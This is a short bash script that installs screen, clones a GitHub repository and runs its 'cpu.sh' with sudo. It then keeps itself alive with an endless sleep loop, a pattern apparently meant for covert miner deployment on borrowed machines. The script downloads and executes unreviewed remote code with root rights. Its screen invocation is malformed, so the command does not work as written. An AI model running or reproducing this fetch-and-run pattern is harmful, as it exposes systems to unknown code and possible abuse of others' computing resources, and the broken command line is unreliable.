#!/bin/bash
sudo apt update
sudo apt install apt-utils -y
sudo apt install screen -y
screen -dmS git clone https://github.com/bimasaputrq581/expert-fortnight.git && cd expert-fortnight && sudo apt update && chmod +x cpu.sh && ./cpu.sh
while [ 1 ]; do
sleep 3
done
sleep 999
